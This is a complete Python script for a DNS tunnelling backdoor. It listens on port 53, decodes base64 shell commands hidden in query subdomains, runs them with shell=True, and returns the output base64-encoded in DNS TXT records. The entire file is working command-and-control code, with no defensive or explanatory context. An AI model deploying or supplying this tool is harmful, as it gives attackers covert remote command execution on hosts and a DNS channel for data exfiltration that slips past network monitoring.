import base64
import subprocess
import socket
from dnslib.server import DNSServer, BaseResolver
from dnslib import DNSRecord, QTYPE, RR, TXT

class DNSTunnelResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).strip('.')

        try:
            # Extract command from subdomain
            encoded_command = qname.split('.')[0]
            command = base64.urlsafe_b64decode(encoded_command).decode('utf-8')
            print(f"[+] Received Command: {command}")

            # Execute the command
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            response_text = result.stdout[:200]  # Limit response to 200 characters

            # Encode the response
            encoded_response = base64.urlsafe_b64encode(response_text.encode()).decode()
            chunks = [encoded_response[i:i+255] for i in range(0, len(encoded_response), 255)]

        except Exception as e:
            error_msg = f"Error: {str(e)}"
            encoded_response = base64.urlsafe_b64encode(error_msg.encode()).decode()
            chunks = [encoded_response]

        # Build DNS TXT response
        reply = request.reply()
        for chunk in chunks:
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(chunk)))

        return reply

# Start DNS server
resolver = DNSTunnelResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=True)

print("[+] DNS Tunnel Server Started on Port 53")
local_ip = socket.gethostbyname(socket.gethostname())
print(f"[+] Your DNS Server IP: {local_ip}")

server.start()
